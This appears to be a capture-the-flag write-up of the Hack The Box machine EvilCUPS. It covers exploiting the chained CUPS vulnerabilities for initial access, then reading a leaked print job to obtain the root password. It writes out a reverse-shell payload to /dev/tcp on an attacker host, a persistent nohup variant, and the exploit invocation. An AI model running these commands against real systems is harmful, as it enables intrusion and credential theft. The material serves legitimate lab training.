HTB: EvilCUPS — Full Writeup (Hard)
🧠 Summary

This machine revolves around the recently disclosed EvilCUPS vulnerabilities, affecting CUPS v2.4.2 and its components. Gaining a shell and privilege escalation required chaining several CVEs and extracting sensitive data from an existing print job.
Root Path:

    ✅ Reverse shell via CVE-2024-47175, CVE-2024-47176, CVE-2024-47076, and CVE-2024-47177

    🔑 Found a print job already on the system → Extracted root password from it

🔍 Reconnaissance

Ran a standard Nmap scan:

nmap -sC -sV -Pn <TARGET-IP>

Open ports:

    22 (SSH)

    631 (IPP - Internet Printing Protocol)

The HTTP title revealed a CUPS web interface, confirming the box is vulnerable to the EvilCUPS attack chain.
🌐 Web Interface Exploration

Visited http://<TARGET-IP>:631
Navigated to the “Printers” tab and spotted an existing printer job. This job becomes critical during privilege escalation.
⚔️ Initial Access via EvilCUPS Exploit Chain

Used the public PoC from IppSec's EvilCUPS repo, which chains multiple CUPS vulnerabilities to execute arbitrary commands via a spoofed IPP printer.

Setup:

    Cloned the repo & installed dependencies:

git clone https://github.com/IppSec/evil-cups
cd evil-cups
pip install -r requirements.txt

Executed the script with:

    python3 evilcups.py -a <ATTACKER-IP> -t <TARGET-IP> -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'

After 60 seconds, a reverse shell was triggered by simulating a fake printer and forcing the target to connect back.

To execute the payload, clicked on “Print Test Page” in the web interface — triggering the malicious job and receiving a shell as a limited user.
🐚 Persistence Tip

Initial reverse shell kept dying — it was tied to the printing process lifecycle.

💡 Fixed by updating the payload to use:

nohup bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1 &

This detached the shell from the parent process, giving a stable session.
🗂️ Privilege Escalation via Print Job Leak

The vulnerable user had --x (execute-only) access on /var/spool/cups — couldn’t read directory contents directly, but could access files by name.

🧠 Trick: You need to know the print job filename beforehand.

From the CUPS web UI, identified job #1:

→ File inferred: d00001-001

    d prefix = print data file

    00001 = job ID

    001 = job instance

Used scp or nc to download d00001-001 to attacker box.

Then converted it:

cupsfilter -m application/pdf d00001-001 > rootjob.pdf

Opened the PDF → it contained the root password.
🔓 Final Step

SSH’ed into the target with:

ssh root@<TARGET-IP>
Password: <from print job>

🚩 Grabbed both user.txt and root.txt.
